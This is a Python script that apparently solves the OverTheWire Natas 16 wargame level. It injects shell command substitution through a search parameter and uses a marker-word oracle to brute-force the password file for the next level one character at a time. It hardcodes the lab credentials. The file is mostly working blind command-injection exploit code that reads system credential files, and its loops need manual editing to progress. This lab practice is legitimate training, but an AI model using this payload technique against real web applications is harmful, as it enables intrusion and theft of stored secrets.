import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
u="http://natas16.natas.labs.overthewire.org/"

# VALID_CHARS = string.digits + string.ascii_letters
# matchingChars = ""

# for c in VALID_CHARS:
#     payload = "$(grep " + c + " /etc/natas_webpass/natas17)zigzag"
#     url = u + "?needle=" + payload + "&submit=Search"

#     response = requests.get(url, auth=basicAuth, verify=False)

#     if 'zigzag' not in response.text:
#         print("Found a valid char : %s" % c)
#         matchingChars += c

# print("Matching chars: ", matchingChars) # matchingChars = "035789bcdghkmnqrswAGHNPQSW"

matchingChars = "05789bhjkoqsvwCEFHJLNOT"
password="" # start with blank password

while True:
    for c in matchingChars:
        payload = "$(grep " + password + c + " /etc/natas_webpass/natas17)zigzag"
        url = u + "?needle=" + payload + "&submit=Search"
        response = requests.get(url, auth=basicAuth, verify=False)

        if 'zigzag' not in response.text:
            print("Found a valid char : %s" % (password+c))
            password += c

        # If you get stuck in this loop, stop the script, comment out the loops at 11 and 25, set matchingChars, then re-run.

# After the first loop, the value will be:
# password = "0GWbn5rd9S7GmAdgQNdkhPkq9cw"
while True:
    for c in matchingChars:
        payload = "$(grep " + c + password + " /etc/natas_webpass/natas17)zigzag"
        url = u + "?needle=" + payload + "&submit=Search"
        response = requests.get(url, auth=basicAuth, verify=False)

        if 'zigzag' not in response.text:
            print("Found a valid char : %s" % (c+password))
            password = c + password